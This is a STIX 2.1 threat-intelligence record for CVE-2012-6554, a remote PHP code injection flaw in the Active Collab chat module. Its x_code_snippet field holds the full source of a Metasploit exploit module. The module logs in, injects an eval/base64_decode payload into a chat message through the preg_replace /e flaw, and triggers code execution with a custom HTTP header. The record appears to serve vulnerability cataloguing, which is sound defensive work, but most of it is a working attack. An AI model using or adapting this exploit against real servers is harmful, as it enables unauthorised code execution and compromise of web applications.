{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5684362f-073b-47f9-bc9f-4fc9e7028605",
    "created": "2024-08-14T17:10:56.062557Z",
    "modified": "2024-08-14T17:10:56.062561Z",
    "name": "Active Collab \"chat module\" Remote PHP Code Injection Exploit",
    "description": " This module exploits an arbitrary code injection vulnerability in the chat module that is part of Active Collab versions 2.3.8 and earlier by abusing a preg_replace() using the /e modifier and its replacement string using double quotes. The vulnerable function can be found in activecollab/application/modules/chat/functions/html_to_text.php.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/activecollab_chat.rb",
            "external_id": "activecollab_chat.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-6554"
        },
        {
            "source_name": "reference",
            "url": "http://www.activecollab.com/downloads/category/4/package/62/releases"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Active Collab \"chat module\" Remote PHP Code Injection Exploit',\n      'Description'    => %q{\n        This module exploits an arbitrary code injection vulnerability in the\n        chat module that is part of Active Collab versions 2.3.8 and earlier by\n        abusing a preg_replace() using the /e modifier and its replacement\n        string using double quotes. The vulnerable function can be found in\n        activecollab/application/modules/chat/functions/html_to_text.php.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'mr_me <steventhomasseeley[at]gmail.com>',  # vuln discovery & msf module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2012-6554'],\n          ['OSVDB', '81966'],\n          ['URL', 'http://www.activecollab.com/downloads/category/4/package/62/releases'],\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Keys'        => ['php'],\n          'Space'       => 4000,\n          'DisableNops' => true,\n        },\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Targets'        => [['Automatic',{}]],\n      'DisclosureDate' => '2012-05-30',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('URI',[true, \"The path to the ActiveCollab installation\", \"/\"]),\n        OptString.new('USER',[true, \"The username (e-mail) to authenticate with\"]),\n        OptString.new('PASS',[true, \"The password to authenticate with\"])\n      ])\n  end\n\n  def check\n\n    login_path = \"public/index.php?path_info=login&re_route=homepage\"\n    uri = normalize_uri(datastore['URI'])\n    uri += (normalize_uri(datastore['URI'])[-1, 1] == \"/\") ? login_path : \"/#{login_path}\"\n\n    cms = send_request_raw({'uri' => uri}, 25)\n\n    uri = normalize_uri(datastore['URI'])\n    uri += (normalize_uri(datastore['URI'])[-1, 1] == \"/\") ? 'public/assets/modules/chat/' : '/public/assets/modules/chat/'\n\n    chat = send_request_raw({'uri' => uri}, 25)\n\n    # cant detect the version here\n    if (cms and cms.body =~ /powered by activeCollab/)\n      # detect the chat module\n      if (chat and chat.code == 200)\n        return Exploit::CheckCode::Detected\n      end\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    user = datastore['USER']\n    pass = datastore['PASS']\n    p = Rex::Text.encode_base64(payload.encoded)\n    header = rand_text_alpha_upper(3)\n    login_uri = normalize_uri(datastore['URI'])\n    login_uri += (normalize_uri(datastore['URI'])[-1, 1] == \"/\") ? 'public/index.php?path_info=login' : '/public/index.php?path_info=login'\n\n    # login\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => login_uri,\n      'vars_post' =>\n        {\n          'login[email]'      => user,\n          'login[password]'   => pass,\n          'submitted'         => \"submitted\",\n        }\n      }, 40)\n\n    # response handling\n    if res and res.code == 302\n      if res.get_cookies =~ /ac_ActiveCollab_sid_[a-zA-Z0-9]+=(.*); expires=/\n        acsession = $1\n      end\n    elsif res and res.body =~ /Failed to log you in/\n      print_error(\"#{rhost}:#{rport} Could not login to the target application as #{user}:#{pass}\")\n    elsif res and res.code != 200 or res.code != 302\n      print_error(\"#{rhost}:#{rport} Server returned a failed status code: (#{res.code})\")\n    end\n\n    # injection\n    iuri = normalize_uri(datastore['URI'])\n    iuri += (normalize_uri(datastore['URI'])[-1, 1] == \"/\") ? 'index.php' : '/index.php'\n    iuri << \"?path_info=chat/add_message&async=1\"\n    phpkode = \"{\\${eval(base64_decode(\\$_SERVER[HTTP_#{header}]))}}\"\n    injection = \"<th>\\\");#{phpkode}</th>\"\n    cookies = \"ac_ActiveCollab_sid_eaM4h3LTIZ=#{acsession}\"\n    res = send_request_cgi({\n      'method'  => 'POST',\n      'uri'     => iuri,\n      'headers' =>\n        {\n          'cookie'  => cookies\n        },\n      'vars_post' =>\n        {\n          'submitted'                  => \"submitted\",\n          'message[message_text]'      => injection,\n          'message[chat_id]'           => \"1\",\n          'message[posted_to_user_id]' => \"all\"\n        }\n    }, 25)\n\n    euri = normalize_uri(datastore['URI'])\n    euri += (normalize_uri(datastore['URI'])[-1, 1] == \"/\") ? 'public/index.php' : '/public/index.php'\n    euri << \"?path_info=/chat/history/1\"\n\n    # execution\n    res = send_request_cgi({\n      'method'  => 'POST',\n      'uri'     => euri,\n      'headers' =>\n        {\n          header    => p,\n          'cookie'  => cookies\n        }\n    })\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-05-30",
    "x_mitre_platforms": [
        "['php']"
    ]
}